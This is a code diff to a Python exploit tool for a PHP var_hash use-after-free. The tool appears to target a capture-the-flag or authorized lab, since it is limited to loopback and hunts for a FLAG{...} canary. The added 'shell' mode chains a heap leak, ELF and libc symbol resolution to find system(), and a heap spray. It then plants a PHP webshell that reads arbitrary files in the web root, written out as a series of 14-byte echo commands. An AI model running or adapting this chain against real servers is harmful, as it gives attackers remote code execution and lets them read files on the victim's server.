@@ -558,11 +558,91 @@ def mode_rce(t: Target, args):
     return 0
 
 
+def _split_for_echo(content, staging='w'):
+    """Vendor ported: split content into <=14-byte `echo -n ...>>w` cmds."""
+    special = set('<>?$`[](){};&|!*#~"\'\\ \t\n')
+    overhead = len(f'echo -n >>{staging}')
+    cmds, i = [], 0
+    while i < len(content):
+        budget = 14 - overhead
+        chunk = ''
+        if content[i] in special:
+            chunk = '\\' + content[i]
+            i += 1
+            budget -= 2
+        while budget > 0 and i < len(content) and content[i] not in special:
+            chunk += content[i]
+            i += 1
+            budget -= 1
+        cmd = f'echo -n {chunk}>>{staging}'
+        assert len(cmd) <= 14, f"BUG: {cmd!r} is {len(cmd)} bytes"
+        cmds.append(cmd)
+    return cmds
+
+
+WEBSHELL_BODY = '<?=readfile($_GET[1])?>'
+
+
+def mode_shell(t: Target, args):
+    """Full chain then multi-stage webshell drop (readfile channel), then
+    fetch --fetch (e.g. /CANARY) through it. Apache CWD = DocumentRoot."""
+    import phpbleed_chain as chain
+    chain.isstring_read = lambda addr, timeout=5: read_at(t, addr, timeout)
+    hr = heap_leak(t)
+    if not hr:
+        log("x", "R-1 heap leak failed"); return 2
+    log("+", f"R-1 LEAKED heap_ref :: 0x{hr:x}")
+    cands = chain.scan_for_elf(hr & ~0x1FFFFF)
+    libphp = eg = pltgot = None
+    for base, phnum in cands:
+        try:
+            eg, pltgot = chain.gnu_hash_resolve(
+                base, 'executor_globals', '_GLOBAL_OFFSET_TABLE_')
+        except RuntimeError:
+            continue
+        libphp = base; break
+    if not libphp:
+        log("x", "R-3 no libphp"); return 2
+    log("+", f"R-3 LIBPHP 0x{libphp:x} EG 0x{eg:x}")
+    libc_base = chain.libc_from_got_dump(libphp, pltgot)
+    if libc_base is None:
+        log("x", "R-4 libc not located"); return 2
+    system_addr = chain.gnu_hash_resolve(libc_base, 'system')
+    log("+", f"R-4 libc 0x{libc_base:x} system 0x{system_addr:x}")
+    ce = chain.lookup_class_table(eg, 'stdclass')
+    if ce is None:
+        log("x", "R-5 ce"); return 2
+    S = chain.find_spray_slot(hr)
+    if S is None:
+        log("x", "R-6 spray"); return 2
+    log("+", f"R-5/6 ce 0x{ce:x} S 0x{S:x}")
+    fname = args.webshell
+    rename = f'mv w {fname}'
+    assert len(rename) <= 14
+    cmds = ['rm -f w'] + _split_for_echo(WEBSHELL_BODY) + [rename]
+    log(">", f"R-7 staging webshell {fname!r} via {len(cmds)} triggers")
+    for i, c in enumerate(cmds, 1):
+        fire_cmd(t, ce, system_addr, S, c.encode('latin-1'))
+        if i % 5 == 0 or i == len(cmds):
+            log("~", f"stage {i}/{len(cmds)} ({t.req_count} reqs)")
+    body = t.get(f"/{fname}", f"?1={args.fetch}")
+    if body and (b"FLAG{" in body or len(body) > 0):
+        log("+", f"SHELL LIVE :: /{fname}")
+        log("+", f"FETCH {args.fetch} -> {body[:200]!r}")
+        if b"FLAG{" in body:
+            import re
+            m = re.search(rb"FLAG\{[^}]+\}", body)
+            log("+", f"CANARY CAPTURED :: {m.group(0).decode()}")
+        return 0
+    log("x", "webshell not reachable"); return 2
+
+
 # --------------------------------------------------------------------------
 def main():
     p = argparse.ArgumentParser(description="Bastet Zend-heap leak tool "
                                 "(var_hash UAF; authorized range only)")
-    p.add_argument("mode", choices=["dump", "probe", "canary", "id", "rce"])
+    p.add_argument("mode", choices=["dump", "probe", "canary", "id", "rce",
+                                    "shell"])
     p.add_argument("url", help="http(s)://127.0.0.1:PORT/path (loopback only)")
     p.add_argument("--field", default="cook", help="POST field carrying the "
                    "payload (vendor remote_app.php uses 'cook')")
@@ -583,6 +663,10 @@ def main():
     p.add_argument("--max-components", type=int, default=1,
                    help="leak components per page window (php2leak parity)")
     p.add_argument("--color", default="always", choices=["always", "never"])
+    p.add_argument("--webshell", default="r.php",
+                   help="shell mode: filename to stage in DocumentRoot")
+    p.add_argument("--fetch", default="/CANARY",
+                   help="shell mode: path to read back through the shell")
     a = p.parse_args()
     banner()
     global _CLASS
@@ -590,7 +674,8 @@ def main():
     t = Target(a.url, field=a.field)
     log(">", f"target acquired :: http://{t.host}:{t.port}{t.path}")
     fn = {"dump": mode_dump, "probe": mode_probe,
-          "canary": mode_canary, "id": mode_id}[a.mode]
+          "canary": mode_canary, "id": mode_id, "rce": mode_rce,
+          "shell": mode_shell}[a.mode]
     sys.exit(fn(t, a))
 
 
